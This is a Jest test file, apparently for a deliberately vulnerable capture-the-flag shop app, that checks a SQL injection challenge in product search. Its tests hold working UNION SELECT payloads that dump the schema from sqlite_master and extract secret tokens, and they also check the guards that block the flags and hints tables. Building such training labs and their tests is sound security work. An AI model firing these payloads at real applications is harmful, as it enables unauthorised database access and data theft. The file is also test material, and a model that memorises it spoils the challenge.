import { apiRequest, canaryFrom, expectFlag } from "../helpers/api";
import { FLAGS } from "../helpers/flags";

interface SearchResponse {
  products: Record<string, unknown>[];
  error?: string;
  flag?: string;
  message?: string;
}

const search = (query: string) =>
  apiRequest<SearchResponse>(
    `/api/products/search?q=${encodeURIComponent(query)}`
  );

/** Closes the LIKE clause and pads the UNION to the catalogue's five columns. */
const union = (column: string, from: string, comment = " --") =>
  `' UNION SELECT 1, ${column}, 'x', 1, 'y' ${from}${comment}`;

describe("SQL Injection - Product Search", () => {
  it("returns the flag once the results carry the internal canary", async () => {
    const { status, data } = await search(
      union(
        "token",
        "FROM internal_secrets WHERE slug='product-search-sql-injection'"
      )
    );

    expect(status).toBe(200);
    expectFlag(data, FLAGS.PRODUCT_SEARCH_SQL_INJECTION);
    expect(JSON.stringify(data.products)).toContain("CANARY-");
  });

  it("refuses a canary the query pasted back in as a literal", async () => {
    const extracted = await search(
      union(
        "token",
        "FROM internal_secrets WHERE slug='product-search-sql-injection'"
      )
    );
    const canary = canaryFrom(extracted.data.products);

    const { status, data } = await search(union(`'${canary}'`, ""));

    expect(status).toBe(200);
    expect(JSON.stringify(data.products)).toContain(canary);
    expect(data).not.toHaveProperty("flag");
  });

  it("leaks the schema through the results, which is how the canary is found", async () => {
    const { status, data } = await search(
      union("group_concat(name)", "FROM sqlite_master WHERE type='table'")
    );

    expect(status).toBe(200);
    expect(JSON.stringify(data.products)).toContain("internal_secrets");
    expect(data).not.toHaveProperty("flag");
  });

  it("does not reward a UNION that extracts nothing", async () => {
    const { status, data } = await search("' UNION SELECT 1,2,3,4,5 --");

    expect(status).toBe(200);
    expect(data).not.toHaveProperty("flag");
    expect(data.message).toContain("SQL syntax detected");
  });

  it("reports the column count mismatch so the UNION can be tuned", async () => {
    const { status, data } = await search("' UNION SELECT 1,2 --");

    expect(status).toBe(500);
    expect(data.error).toContain("same number of result columns");
  });

  it("blocks access to the flags table", async () => {
    const { status, data } = await search("' UNION SELECT flag FROM flags --");

    expect(status).toBe(403);
    expect(data.error).toContain(
      "Access to the flags and hints tables is not allowed"
    );
  });

  it("blocks the flags table even when the name is schema-qualified", async () => {
    const { status, data } = await search(
      union("group_concat(flag)", "FROM main.flags", "--")
    );

    expect(status).toBe(403);
    expect(data.error).toContain(
      "Access to the flags and hints tables is not allowed"
    );
  });

  it("blocks the hints table, which would hand over every walkthrough", async () => {
    const { status, data } = await search(
      union("group_concat(content)", "FROM hints", "--")
    );

    expect(status).toBe(403);
    expect(data.error).toContain(
      "Access to the flags and hints tables is not allowed"
    );
  });

  it("searches the catalogue without returning a flag", async () => {
    const { status, data } = await search("bread");

    expect(status).toBe(200);
    expect(Array.isArray(data.products)).toBe(true);
    expect(data).not.toHaveProperty("flag");
    expect(data).not.toHaveProperty("message");
  });

  it("returns empty results for an empty query", async () => {
    const { status, data } = await search("");

    expect(status).toBe(200);
    expect(data.products).toEqual([]);
  });
});
